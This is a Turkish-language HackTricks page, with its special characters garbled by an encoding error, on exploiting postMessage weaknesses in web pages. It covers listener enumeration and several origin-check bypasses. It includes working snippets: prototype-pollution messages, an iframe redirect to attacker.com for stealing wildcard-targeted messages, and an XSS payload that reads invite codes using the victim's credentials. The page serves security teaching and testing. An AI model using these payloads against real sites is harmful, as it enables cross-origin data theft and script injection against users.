# PostMessage AÃ§Ä±klarÄ±

## PostMessage AÃ§Ä±klarÄ±

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}


## **PostMessage** GÃ¶nder

**PostMessage**, bir mesaj gÃ¶ndermek iÃ§in aÅŸaÄŸÄ±daki iÅŸlevi kullanÄ±r:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Not edin ki **targetOrigin** bir '\*' veya _https://company.com_ gibi bir URL olabilir.\
**Ä°kinci senaryoda**, **mesaj yalnÄ±zca o alana gÃ¶nderilebilir** (pencere nesnesinin kÃ¶keni farklÄ± olsa bile).\
EÄŸer **joker karakter** kullanÄ±lÄ±yorsa, **mesajlar herhangi bir alana gÃ¶nderilebilir** ve Pencere nesnesinin kÃ¶kenine gÃ¶nderilecektir.

### iframe'leri hedef alma & **targetOrigin**'de joker karakter

[**bu raporda**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) aÃ§Ä±klandÄ±ÄŸÄ± gibi, **iframelenebilen** (hiÃ§bir `X-Frame-Header` korumasÄ± olmayan) ve **duyarlÄ±** mesajÄ± **postMessage** aracÄ±lÄ±ÄŸÄ±yla **joker karakter** (\*) kullanarak **gÃ¶nderen** bir sayfa bulursanÄ±z, **iframe**'in **kÃ¶kenini** **deÄŸiÅŸtirebilir** ve **duyarlÄ±** mesajÄ± sizin kontrolÃ¼nÃ¼zdeki bir alana **sÄ±zdÄ±rabilirsiniz**.\
EÄŸer sayfa iframelenebiliyorsa ancak **targetOrigin** **bir URL'ye ayarlandÄ±ysa ve joker karaktere deÄŸilse**, bu **numara Ã§alÄ±ÅŸmayacaktÄ±r**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener istismarÄ±

**`addEventListener`** JS tarafÄ±ndan **`postMessages`** bekleyen fonksiyonu tanÄ±mlamak iÃ§in kullanÄ±lan iÅŸlevdir.\
AÅŸaÄŸÄ±daki gibi bir kod kullanÄ±lacaktÄ±r:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Not edin ki bu durumda kodun yaptÄ±ÄŸÄ± **ilk ÅŸey** **kaynaÄŸÄ± kontrol etmek**. Bu, alÄ±nan bilgilerle **herhangi bir hassas ÅŸey** yapÄ±lacaksa son derece **Ã¶nemlidir** (Ã¶rneÄŸin bir ÅŸifre deÄŸiÅŸtirmek gibi). **EÄŸer kaynaÄŸÄ± kontrol etmezse, saldÄ±rganlar kurbanlarÄ±n bu uÃ§ noktalara rastgele veri gÃ¶ndermesini saÄŸlayabilir** ve kurbanlarÄ±n ÅŸifrelerini deÄŸiÅŸtirebilir (bu Ã¶rnekte).

### SayÄ±m

Mevcut sayfadaki **olay dinleyicilerini bulmak** iÃ§in ÅŸunlarÄ± yapabilirsiniz:

* **JS kodunda** `window.addEventListener` ve `$(window).on` (_JQuery versiyonu_) iÃ§in **arama yapÄ±n**
* GeliÅŸtirici araÃ§larÄ± konsolunda **ÅŸunu Ã§alÄ±ÅŸtÄ±rÄ±n**: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* TarayÄ±cÄ±nÄ±n geliÅŸtirici araÃ§larÄ±nda _Elements --> Event Listeners_ kÄ±smÄ±na **gidin**

![](<../../.gitbook/assets/image (396).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) veya [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) gibi bir **tarayÄ±cÄ± uzantÄ±sÄ±** kullanÄ±n. Bu tarayÄ±cÄ± uzantÄ±larÄ± **tÃ¼m mesajlarÄ± yakalar** ve size gÃ¶sterir.

### Kaynak kontrolÃ¼ atlatmalarÄ±

* **`event.isTrusted`** niteliÄŸi gÃ¼venli kabul edilir Ã§Ã¼nkÃ¼ yalnÄ±zca gerÃ§ek kullanÄ±cÄ± eylemleri tarafÄ±ndan Ã¼retilen olaylar iÃ§in `True` dÃ¶ner. DoÄŸru bir ÅŸekilde uygulanÄ±rsa atlatÄ±lmasÄ± zor olsa da, gÃ¼venlik kontrollerindeki Ã¶nemi dikkate deÄŸerdir.
*   PostMessage olaylarÄ±nda kaynak doÄŸrulamasÄ± iÃ§in **`indexOf()`** kullanÄ±mÄ± atlatmaya karÅŸÄ± hassas olabilir. Bu zayÄ±flÄ±ÄŸÄ± gÃ¶steren bir Ã¶rnek:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
*   `String.prototype.search()`'ten **`search()`** metodu, dÃ¼zenli ifadeler iÃ§in tasarlanmÄ±ÅŸtÄ±r, dizeler iÃ§in deÄŸil. Regexp dÄ±ÅŸÄ±nda bir ÅŸey geÃ§mek, metodun potansiyel olarak gÃ¼vensiz hale gelmesine neden olan regex'e Ã¶rtÃ¼k dÃ¶nÃ¼ÅŸÃ¼me yol aÃ§ar. Bunun nedeni, regex'te bir noktanÄ±n (.) joker karakter olarak iÅŸlev gÃ¶rmesi ve Ã¶zel olarak hazÄ±rlanmÄ±ÅŸ alan adlarÄ±yla doÄŸrulamanÄ±n atlatÄ±lmasÄ±na olanak tanÄ±masÄ±dÄ±r. Ã–rneÄŸin:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* **`match()`** fonksiyonu, `search()` ile benzer ÅŸekilde regex'i iÅŸler. EÄŸer regex yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, atlatmaya karÅŸÄ± hassas olabilir.
*   **`escapeHtml`** fonksiyonu, karakterleri kaÃ§Ä±rarak girdileri temizlemek iÃ§in tasarlanmÄ±ÅŸtÄ±r. Ancak, yeni bir kaÃ§Ä±rÄ±lmÄ±ÅŸ nesne oluÅŸturmaz, mevcut nesnenin Ã¶zelliklerini Ã¼zerine yazar. Bu davranÄ±ÅŸ istismar edilebilir. Ã–zellikle, bir nesne, kontrol edilen Ã¶zelliÄŸinin `hasOwnProperty`'yi tanÄ±mayacak ÅŸekilde manipÃ¼le edilebiliyorsa, `escapeHtml` beklenildiÄŸi gibi Ã§alÄ±ÅŸmayacaktÄ±r. Bu, aÅŸaÄŸÄ±daki Ã¶rneklerde gÃ¶sterilmektedir:

*   Beklenen Hata:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   KaÃ§Ä±rma:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Bu zayÄ±flÄ±k baÄŸlamÄ±nda, `File` nesnesi, yalnÄ±zca okunabilir `name` Ã¶zelliÄŸi nedeniyle Ã¶zellikle istismar edilebilir. Bu Ã¶zellik, ÅŸablonlarda kullanÄ±ldÄ±ÄŸÄ±nda `escapeHtml` fonksiyonu tarafÄ±ndan temizlenmez ve potansiyel gÃ¼venlik risklerine yol aÃ§ar.
* JavaScript'teki `document.domain` Ã¶zelliÄŸi, bir script tarafÄ±ndan alan adÄ±nÄ± kÄ±saltmak iÃ§in ayarlanabilir, bu da aynÄ± Ã¼st alan adÄ± iÃ§inde daha gevÅŸek bir aynÄ± kÃ¶ken politikasÄ± uygulanmasÄ±na olanak tanÄ±r.

### e.origin == window.origin atlatmasÄ±

Bir **sandboxed iframe** iÃ§inde bir web sayfasÄ± gÃ¶mÃ¼ldÃ¼ÄŸÃ¼nde %%%%%%, iframe'in kaynaÄŸÄ±nÄ±n null olarak ayarlanacaÄŸÄ±nÄ± anlamak Ã¶nemlidir. Bu, **sandbox nitelikleri** ile gÃ¼venlik ve iÅŸlevsellik Ã¼zerindeki etkileriyle ilgilenirken Ã¶zellikle Ã¶nemlidir.

**`allow-popups`** niteliklerini belirleyerek, iframe iÃ§inden aÃ§Ä±lan herhangi bir aÃ§Ä±lÄ±r pencere, Ã¼st Ã¶ÄŸesinin sandbox kÄ±sÄ±tlamalarÄ±nÄ± miras alÄ±r. Bu, **`allow-popups-to-escape-sandbox`** niteliÄŸi de dahil edilmediÄŸi sÃ¼rece, aÃ§Ä±lÄ±r pencerenin kaynaÄŸÄ±nÄ±n da `null` olarak ayarlandÄ±ÄŸÄ± anlamÄ±na gelir ve bu, iframe'in kaynaÄŸÄ± ile uyumludur.

SonuÃ§ olarak, bu koÅŸullar altÄ±nda bir aÃ§Ä±lÄ±r pencere aÃ§Ä±ldÄ±ÄŸÄ±nda ve iframe'den aÃ§Ä±lÄ±r pencereye **`postMessage`** kullanÄ±larak bir mesaj gÃ¶nderildiÄŸinde, hem gÃ¶nderim hem de alÄ±m uÃ§larÄ±nÄ±n kaynaklarÄ± `null` olarak ayarlanÄ±r. Bu durum, **`e.origin == window.origin`** ifadesinin doÄŸru deÄŸerlendirilmesine yol aÃ§ar (`null == null`), Ã§Ã¼nkÃ¼ hem iframe hem de aÃ§Ä±lÄ±r pencere aynÄ± `null` kaynak deÄŸerini paylaÅŸÄ±r.

Daha fazla bilgi iÃ§in **okuyun**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source atlatma

MesajÄ±n, scriptin dinlediÄŸi aynÄ± pencereden gelip gelmediÄŸini kontrol etmek mÃ¼mkÃ¼ndÃ¼r (Ã¶zellikle **tarayÄ±cÄ± uzantÄ±larÄ±ndan iÃ§erik scriptleri** iÃ§in mesajÄ±n aynÄ± sayfadan gÃ¶nderilip gÃ¶nderilmediÄŸini kontrol etmek ilginÃ§tir):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
**`e.source`**'un bir mesajÄ±n null olmasÄ±nÄ± saÄŸlamak iÃ§in, **postMessage** gÃ¶nderen ve **hemen silinen** bir **iframe** oluÅŸturabilirsiniz.

Daha fazla bilgi iÃ§in **ÅŸunu okuyun:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header atlatma

Bu saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in ideal olarak **kurban web sayfasÄ±nÄ±** bir `iframe` iÃ§ine alabilmeniz gerekir. Ancak `X-Frame-Header` gibi bazÄ± baÅŸlÄ±klar bu **davranÄ±ÅŸÄ±** **engelleyebilir**.\
Bu senaryolarda, daha az gizli bir saldÄ±rÄ± kullanmaya devam edebilirsiniz. ZayÄ±f web uygulamasÄ±na yeni bir sekme aÃ§abilir ve onunla iletiÅŸim kurabilirsiniz:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Ana sayfayÄ± engelleyerek Ã§ocuÄŸa gÃ¶nderilen mesajÄ± Ã§almak

AÅŸaÄŸÄ±daki sayfada, **veriyi gÃ¶ndermeden Ã¶nce** **ana** sayfayÄ± **engelleyerek** bir **Ã§ocuk iframe**'ine gÃ¶nderilen **hassas postmessage verisini** nasÄ±l Ã§alabileceÄŸinizi gÃ¶rebilirsiniz ve **Ã§ocukta bir XSS** kullanarak veriyi **sÄ±zdÄ±rabilirsiniz**:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframe konumunu deÄŸiÅŸtirerek mesaj Ã§almak

X-Frame-Header iÃ§ermeyen bir web sayfasÄ±nÄ± iframe'leyebiliyorsanÄ±z ve bu sayfa baÅŸka bir iframe iÃ§eriyorsa, o **Ã§ocuk iframe'in konumunu** **deÄŸiÅŸtirebilirsiniz**, bÃ¶ylece eÄŸer bir **wildcard** kullanÄ±larak gÃ¶nderilen bir **postmessage** alÄ±yorsa, bir saldÄ±rgan o iframe'in **kaynaÄŸÄ±nÄ±** kendisinin **kontrol ettiÄŸi** bir sayfaya **deÄŸiÅŸtirebilir** ve mesajÄ± **Ã§alabilir**:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage ile Prototip KirliliÄŸi ve/veya XSS

`postMessage` ile gÃ¶nderilen verilerin JS tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ± senaryolarda, **sayfayÄ± iframe'leyebilir** ve **prototip kirliliÄŸi/XSS**'yi **postMessage** aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderilen istismar ile **sÃ¶mÃ¼rebilirsiniz**.

[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html) adresinde **postMessage** aracÄ±lÄ±ÄŸÄ±yla **Prototip KirliliÄŸi ve ardÄ±ndan XSS**'yi istismar etmek iÃ§in Ã§ok iyi aÃ§Ä±klanmÄ±ÅŸ birkaÃ§ **XSS Ã¶rneÄŸi** bulunmaktadÄ±r.

Bir `iframe`'e `postMessage` aracÄ±lÄ±ÄŸÄ±yla **Prototip KirliliÄŸi ve ardÄ±ndan XSS**'yi istismar etmek iÃ§in bir Ã¶rnek:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
For **daha fazla bilgi**:

* [**prototip kirlenmesi**](../deserialization/nodejs-proto-prototype-pollution/) hakkÄ±nda sayfaya baÄŸlantÄ±
* [**XSS**](../xss-cross-site-scripting/) hakkÄ±nda sayfaya baÄŸlantÄ±
* [**istemci tarafÄ± prototip kirlenmesi ile XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) hakkÄ±nda sayfaya baÄŸlantÄ±

## Referanslar

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Pratik yapmak iÃ§in: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± Ekip UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± Ekip UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
